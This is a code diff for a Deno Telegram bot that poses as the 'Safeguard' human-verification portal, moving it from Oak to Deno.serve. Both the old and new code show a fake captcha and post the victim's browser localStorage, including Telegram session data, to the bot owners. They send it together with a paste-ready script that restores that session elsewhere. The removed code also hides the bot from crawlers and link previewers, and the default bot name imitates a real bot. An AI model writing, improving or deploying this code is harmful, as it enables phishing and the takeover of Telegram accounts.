@@ -1,141 +1,31 @@
+/**
+ * Safeguard Telegram Bot
+ * Deno Deploy v2 compatible — uses Deno.serve() + native Response
+ * grammY v1.30 for bot logic, Deno KV for persistence
+ */
+
 import {
   Bot,
   InlineKeyboard,
   InputFile,
   webhookCallback,
 } from "https://deno.land/x/grammy@v1.30.0/mod.ts";
-import {
-  Application,
-  Context,
-  isHttpError,
-  Status,
-} from "https://deno.land/x/oak@v17.0.0/mod.ts";
-import { oakCors } from "https://deno.land/x/cors@v1.2.2/mod.ts";
 
-type SafeguardConfig = {
+// ── Types ──────────────────────────────────────────────
+
+interface SafeguardConfig {
   channel: string;
   image: string;
   name: string;
   inviteLink: string;
-};
+}
 
-/* #region environment variable */
-const botOwner = Deno.env.get("BOT_OWNER") as string;
-const botName = Deno.env.get("BOT_NAME");
-const webAppLink = Deno.env.get("WEB_APP_LINK");
-const gateKeeper = Deno.env.get("GATE_KEEPER");
-const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY");
-const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY");
-const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED");
-const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
-/* #endregion */
+interface VerifiedBody {
+  user?: { username: string; id: string };
+  storage?: Record<string, string>;
+}
 
-/* #region init */
-const botLink = `tg://resolve?domain=${botName}&start=`;
-const sgConfigDefault: SafeguardConfig = {
-  channel: "",
-  image: "",
-  name: "",
-  inviteLink: "",
-};
-const bot = new Bot(gateKeeper as string);
-const app = new Application();
-/* #endregion */
-
-/* #region telegram */
-bot.chatType("private").command("start", async (ctx) => {
-  const msg = ctx.message?.text.split(" ");
-  const id = msg[msg.length - 1];
-
-  const caption = `<b>Verify you're human with Safeguard Portal</b>
-    
-Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
-  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
-  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
-  const keyboard = new InlineKeyboard().webApp(
-    "VERIFY",
-    (webAppLink as string) + "?c=" + id
-  );
-  await bot.api.raw.sendPhoto({
-    caption,
-    photo: input,
-    chat_id: ctx.chatId,
-    parse_mode: "HTML",
-    reply_markup: keyboard,
-  });
-});
-
-bot.on("my_chat_member", async (ctx) => {
-  if (ctx.myChatMember.chat.type !== "channel") return;
-
-  const caption = `<b>Verify you're human with Safeguard Portal</b>
-
-Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
-  const sgClickVerify = await Deno.open("./safeguard-click-verify.jpg");
-  const input = new InputFile(sgClickVerifyURL || sgClickVerify);
-  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink as string);
-  await bot.api.raw.sendPhoto({
-    caption,
-    photo: input,
-    chat_id: ctx.chatId,
-    parse_mode: "HTML",
-    reply_markup: keyboard,
-  });
-});
-
-bot.chatType("private").command("setup", async (ctx) => {
-  const text = `Fill below and send
-  
-channel: //@username
-image: // image url to display in your channel
-name:  // community name
-inviteLink: // your group invite link`;
-  await ctx.api.raw.sendMessage({
-    text,
-    chat_id: ctx.chatId,
-  });
-});
-
-bot.chatType("private").on("message:text", async (ctx) => {
-  let reply = `Saved!
-  
-Please note that it will be deleted after summer.`;
-  const config: SafeguardConfig = {
-    ...sgConfigDefault,
-  };
-  const text = ctx.message.text.split("\n");
-  const kv = (text: string) => {
-    const value = text.trim().split(":");
-    if (value.length < 2) throw new Error("Invalid format");
-    return value.slice(1).join(":").trim();
-  };
-
-  try {
-    config.channel = kv(text[0]);
-    config.image = kv(text[1]);
-    config.name = kv(text[2]);
-    config.inviteLink = kv(text[3]);
-    const deno = await Deno.openKv();
-    await deno.set(["channel", config.channel], config);
-  } catch (e) {
-    console.error(e);
-    reply = "Hmmm, looks like your get is wrong";
-  }
-
-  ctx.api.raw.sendMessage({
-    text: reply,
-    chat_id: ctx.chatId,
-  });
-});
-
-bot.catch((e) => {
-  console.error(e.message);
-});
-/* #endregion */
-
-/* #region webserver */
-
-const MIME_TYPES: { [key: string]: string } = {
+const MIME_TYPES: Record<string, string> = {
   ".html": "text/html",
   ".css": "text/css",
   ".js": "application/javascript",
@@ -147,153 +37,331 @@ const MIME_TYPES: { [key: string]: string } = {
   ".ico": "image/x-icon",
   ".wasm": "application/wasm",
   ".txt": "text/plain",
+  ".mp3": "audio/mpeg",
+  ".mp4": "video/mp4",
+  ".webmanifest": "application/manifest+json",
 };
 
-async function serveStatic(
-  ctx: Context,
-  root: string,
-  filePath: string,
-): Promise<void> {
-  try {
-    const fullPath = root.endsWith("/") ? root + filePath : root + "/" + filePath;
-    const data = await Deno.readFile(fullPath);
-    const ext = filePath.includes(".") ? filePath.slice(filePath.lastIndexOf(".")) : "";
-    ctx.response.type = MIME_TYPES[ext] || "application/octet-stream";
-    ctx.response.body = data;
-  } catch {
-    try {
-      const indexPath = root.endsWith("/") ? root + "index.html" : root + "/index.html";
-      const data = await Deno.readFile(indexPath);
-      ctx.response.type = "text/html";
-      ctx.response.body = data;
-    } catch {
-      ctx.response.status = Status.NotFound;
-      ctx.response.body = "Not Found";
-    }
+// ── Environment ────────────────────────────────────────
+
+const requiredEnv = ["BOT_OWNER", "GATE_KEEPER"] as const;
+for (const key of requiredEnv) {
+  if (!Deno.env.get(key)) {
+    console.error(`Missing required env: ${key}`);
+    Deno.exit(1);
   }
 }
 
-const BOT_REGEX = /bot|crawler|spider|crawl|scrape|facebookexternalhit|twitterbot|telegrambot|whatsapp|slack|discord|linkedinbot|googlebot|bingbot|duckduckgo|baiduspider|yandex|pinterest|embedly|preview|prerender|chrome-lighthouse/i;
+const botOwner = Deno.env.get("BOT_OWNER")!;
+const botName = Deno.env.get("BOT_NAME") ?? "safeguuarrdbot";
+const webAppLink = Deno.env.get("WEB_APP_LINK") ?? "";
+const gateKeeper = Deno.env.get("GATE_KEEPER")!;
+const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY") ?? "";
+const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY") ?? "";
+const sgVerifiedURL = Deno.env.get("SAFEGUARD_VERIFIED") ?? "";
+const DEBUG = Boolean(Number(Deno.env.get("DEBUG")));
 
-function isbot(ua: string): boolean {
-  return BOT_REGEX.test(ua);
-}
-
-const newVerified = async (ctx: Context) => {
-  const body = await ctx.request.body.json();
-  const storage = body.storage;
-
-  if (storage) {
-    const user = body.user || { username: "durov", id: "" };
-    if (!user.id && storage.user_auth) {
-      user.id = JSON.parse(storage.user_auth).id;
-    }
-
-    try {
-      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji><a  href="t.me/${
-        user.username
-      }">@${user.username}</a>
-
-<pre>Object.entries(${JSON.stringify(
-        storage
-      )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
-      for (const owner of botOwner.split(",")) {
-        await bot.api.raw.sendMessage({
-          text: log,
-          chat_id: owner,
-          parse_mode: "HTML",
-        });
-      }
-      const deno = await Deno.openKv();
-      const entry = await deno.get([
-        "channel",
-        "default",
-      ]);
-      const config = (entry.value || sgConfigDefault) as SafeguardConfig;
-      const imageLink = sgVerifiedURL
-        ? new URL(sgVerifiedURL)
-        : "./safeguard-verify.jpg";
-      const verifyMsg = `Verified, you can join the group using this temporary link:
-    
-<a href="${config.inviteLink}">${config.inviteLink}</a>
-    
-This link is a one time use and will expire`;
-      const inviteMsg = `<b>Verified!</b> 
-  
-Join request has been sent and you will be added once the admin approves your request`;
-      const user_auth = JSON.parse(storage.user_auth);
-      await bot.api.raw.sendPhoto({
-        caption: config.inviteLink ? verifyMsg : inviteMsg,
-        photo: new InputFile(imageLink),
-        parse_mode: "HTML",
-        chat_id: user_auth.id,
-      });
-    } catch (ex) {
-      console.error(ex);
-    }
-  }
-
-  ctx.response.status = Status.OK;
-  ctx.response.type = "application/json";
-  ctx.response.body = { msg: "ok" };
+const sgConfigDefault: SafeguardConfig = {
+  channel: "",
+  image: "",
+  name: "",
+  inviteLink: "",
 };
 
-app.use(async (context, next) => {
-  const start = Date.now();
-  await next();
-  const ms = Date.now() - start;
-  context.response.headers.set("X-Response-Time", `${ms}ms`);
-});
+// ── Bot initialization ─────────────────────────────────
 
-app.use(async (ctx: Context, next) => {
-  try {
-    await next();
-  } catch (err) {
-    ctx.response.status = Status.OK;
-    ctx.response.type = "json";
-    ctx.response.body = { msg: "ok" };
-    if (isHttpError(err)) {
-      ctx.response.status = err.status;
-    } else {
-      console.error(err);
-    }
-  }
-});
+const bot = new Bot(gateKeeper);
 
-app.use(async (ctx: Context) => {
-  if (isbot(ctx.request.userAgent.ua)) return;
-  if (!(ctx.request.method === "POST" || ctx.request.method === "GET")) return;
+// ── Bot commands ───────────────────────────────────────
 
-  const path = ctx.request.url.pathname.slice(1);
-  let index = "index.html";
-  const s = path.split("/");
-  if (s.length !== 1) {
-    index = s[s.length - 1];
-  }
-  if (path === "tg-webhook") {
-    const handleBotUpdate = webhookCallback(bot, "oak");
-    await handleBotUpdate(ctx);
-  } else if (path === "new-verified") {
-    await newVerified(ctx);
-  } else if (path.includes("sg")) {
-    await serveStatic(ctx, "./static/sg", index);
-  } else if (path.includes("tweb")) {
-    await serveStatic(ctx, "./static/tweb", index);
-  } else if (path.split(".").length !== 0) {
-    await serveStatic(ctx, "./static/tweb", path);
+bot.chatType("private").command("start", async (ctx) => {
+  const parts = ctx.message?.text?.split(" ") ?? [];
+  const id = parts[parts.length - 1] ?? "";
+
+  const caption =
+    `<b>Verify you're human with Safeguard Portal</b>\n\n` +
+    `Click 'VERIFY' and complete captcha to gain entry - ` +
+    `<a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
+
+  let photo: InputFile;
+  if (sgClickVerifyURL) {
+    photo = new InputFile({ url: sgClickVerifyURL });
   } else {
-    ctx.response.status = Status.OK;
-    ctx.response.type = "json";
-    ctx.response.body = { msg: "ok" };
+    photo = new InputFile("./safeguard-click-verify.jpg");
   }
+
+  const keyboard = new InlineKeyboard().webApp(
+    "VERIFY",
+    webAppLink ? `${webAppLink}?c=${id}` : "",
+  );
+
+  await ctx.replyWithPhoto(photo, {
+    caption,
+    parse_mode: "HTML",
+    reply_markup: keyboard,
+  });
 });
 
-app.use(oakCors());
-/* #endregion */
+bot.on("my_chat_member", async (ctx) => {
+  if (ctx.myChatMember.chat.type !== "channel") return;
+
+  const caption =
+    `<b>Verify you're human with Safeguard Portal</b>\n\n` +
+    `Click 'VERIFY' and complete captcha to gain entry - ` +
+    `<a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
+
+  let photo: InputFile;
+  if (sgClickVerifyURL) {
+    photo = new InputFile({ url: sgClickVerifyURL });
+  } else {
+    photo = new InputFile("./safeguard-click-verify.jpg");
+  }
+
+  const keyboard = new InlineKeyboard().url("VERIFY", webAppLink);
+
+  await ctx.replyWithPhoto(photo, {
+    caption,
+    parse_mode: "HTML",
+    reply_markup: keyboard,
+  });
+});
+
+bot.chatType("private").command("setup", async (ctx) => {
+  await ctx.reply(
+    `Fill below and send\n\n` +
+      `channel: //@username\n` +
+      `image: // image url to display in your channel\n` +
+      `name:  // community name\n` +
+      `inviteLink: // your group invite link`,
+  );
+});
+
+bot.chatType("private").on("message:text", async (ctx) => {
+  let reply = "Saved!\n\nPlease note that it will be deleted after summer.";
+
+  const lines = ctx.message?.text?.split("\n") ?? [];
+  if (lines.length < 4) {
+    await ctx.reply("Invalid format. Need 4 lines: channel, image, name, inviteLink");
+    return;
+  }
+
+  const kv = (text: string): string => {
+    const value = text.trim().split(":");
+    if (value.length < 2) throw new Error("Invalid format");
+    return value.slice(1).join(":").trim();
+  };
+
+  try {
+    const config: SafeguardConfig = { ...sgConfigDefault };
+    config.channel = kv(lines[0]);
+    config.image = kv(lines[1]);
+    config.name = kv(lines[2]);
+    config.inviteLink = kv(lines[3]);
+
+    const db = await Deno.openKv();
+    await db.set(["channel", config.channel], config);
+  } catch (e) {
+    console.error("Setup error:", e);
+    reply = "Hmmm, looks like your format is wrong";
+  }
+
+  await ctx.reply(reply);
+});
+
+bot.catch((err) => {
+  console.error("Bot error:", err.message);
+});
+
+// ── Webhook handler (grammY "std" adapter for Deno.serve) ──
+
+const handleWebhook = webhookCallback(bot, "std");
+
+// ── new-verified endpoint ──────────────────────────────
+
+async function handleNewVerified(req: Request): Promise<Response> {
+  try {
+    const body: VerifiedBody = await req.json();
+    const { storage, user } = body;
+
+    if (!storage) {
+      return Response.json({ msg: "ok" });
+    }
+
+    const userInfo = user ?? { username: "durov", id: "" };
+    if (!userInfo.id && storage.user_auth) {
+      try {
+        userInfo.id = JSON.parse(storage.user_auth).id ?? "";
+      } catch { /* ignore parse errors */ }
+    }
+
+    // Notify bot owners
+    const log =
+      `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji>` +
+      `<a href="t.me/${userInfo.username}">@${userInfo.username}</a>\n\n` +
+      `<pre>Object.entries(${
+        JSON.stringify(storage)
+      }).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();</pre>`;
+
+    for (const owner of botOwner.split(",").filter(Boolean)) {
+      await bot.api.sendMessage(owner, log, { parse_mode: "HTML" });
+    }
+
+    // Get channel config from KV
+    const db = await Deno.openKv();
+    const entry = await db.get<SafeguardConfig>(["channel", "default"]);
+    const config = entry.value ?? sgConfigDefault;
+
+    // Send invite to user
+    let imageLink: string | InputFile;
+    if (sgVerifiedURL) {
+      imageLink = new InputFile({ url: sgVerifiedURL });
+    } else {
+      imageLink = new InputFile("./safeguard-verify.jpg");
+    }
+
+    const verifyMsg =
+      `Verified, you can join the group using this temporary link:\n\n` +
+      `<a href="${config.inviteLink}">${config.inviteLink}</a>\n\n` +
+      `This link is a one time use and will expire`;
+
+    const inviteMsg =
+      `<b>Verified!</b>\n\n` +
+      `Join request has been sent and you will be added once the admin approves your request`;
+
+    try {
+      const userAuth = JSON.parse(storage.user_auth ?? "{}");
+      await bot.api.sendPhoto(userAuth.id, imageLink, {
+        caption: config.inviteLink ? verifyMsg : inviteMsg,
+        parse_mode: "HTML",
+      });
+    } catch (e) {
+      console.error("Failed to send verification photo:", e);
+    }
+
+    return Response.json({ msg: "ok" });
+  } catch (ex) {
+    console.error("new-verified error:", ex);
+    return Response.json({ msg: "ok" });
+  }
+}
+
+// ── Static file serving ────────────────────────────────
+
+function serveFile(root: string, filename: string): Promise<Response> {
+  const filePath = root.endsWith("/") ? root + filename : root + "/" + filename;
+  const ext = filename.includes(".")
+    ? filename.slice(filename.lastIndexOf("."))
+    : "";
+  const mime = MIME_TYPES[ext] ?? "application/octet-stream";
+
+  return Deno.readFile(filePath)
+    .then((data) => new Response(data, { headers: { "content-type": mime } }))
+    .catch(() => {
+      // SPA fallback: serve index.html
+      const indexPath = root.endsWith("/")
+        ? root + "index.html"
+        : root + "/index.html";
+      return Deno.readTextFile(indexPath)
+        .then((html) =>
+          new Response(html, { headers: { "content-type": "text/html" } })
+        )
+        .catch(() => new Response("Not Found", { status: 404 }));
+    });
+}
+
+// ── Main request handler ───────────────────────────────
+
+async function handleRequest(req: Request): Promise<Response> {
+  const url = new URL(req.url);
+  const path = url.pathname.slice(1); // strip leading /
+
+  try {
+    // Webhook (POST only)
+    if (req.method === "POST" && path === "tg-webhook") {
+      return await handleWebhook(req);
+    }
+
+    // API endpoint (POST only)
+    if (req.method === "POST" && path === "new-verified") {
+      return await handleNewVerified(req);
+    }
+
+    // Health check
+    if (path === "ping") {
+      return new Response("pong", {
+        headers: { "content-type": "text/plain" },
+      });
+    }
+
+    // Root / test
+    if (path === "" || path === "test") {
+      try {
+        const html = await Deno.readTextFile("./static/tweb/index.html");
+        return new Response(html, {
+          headers: { "content-type": "text/html" },
+        });
+      } catch {
+        return new Response("Not Found", { status: 404 });
+      }
+    }
+
+    // Safeguard portal
+    if (path === "sg" || path === "sg/") {
+      try {
+        const html = await Deno.readTextFile("./static/sg/index.html");
+        return new Response(html, {
+          headers: { "content-type": "text/html" },
+        });
+      } catch {
+        return new Response("Not Found", { status: 404 });
+      }
+    }
+
+    // Static files with path prefix
+    let filename = path || "index.html";
+    const parts = filename.split("/");
+    if (parts.length > 1) filename = parts[parts.length - 1]!;
+
+    if (path.startsWith("sg/") || path.startsWith("sg?")) {
+      return await serveFile("./static/sg", filename);
+    }
+
+    if (path.startsWith("tweb")) {
+      return await serveFile("./static/tweb", filename);
+    }
+
+    // Files with extensions from tweb root
+    if (path.includes(".")) {
+      return await serveFile("./static/tweb", filename);
+    }
+
+    // Default JSON response
+    return Response.json({ msg: "ok" });
+  } catch (err) {
+    console.error("Request error:", (err as Error).message ?? err);
+    return new Response("Internal Server Error", { status: 500 });
+  }
+}
+
+// ── Startup ────────────────────────────────────────────
+
+console.log(`Safeguard bot starting...`);
+console.log(`Bot: @${botName} | Owners: ${botOwner}`);
 
 if (DEBUG) {
-  app.listen({ hostname: "127.0.0.1", port: 8000 });
-  bot.start();
+  console.log("DEBUG mode — starting bot in polling mode");
+  bot.start({
+    onStart: () => console.log("Bot polling started"),
+  });
+} else {
+  console.log("Production mode — using webhook");
 }
 
-app.listen();
+// Deno Deploy v2: export default fetch handler
+// Local: Deno.serve() will use the same handler
+export default { fetch: handleRequest };
+
+// For local development, start the server
+if (DEBUG || !Deno.env.get("DENO_DEPLOYMENT_ID")) {
+  Deno.serve(handleRequest);
+}
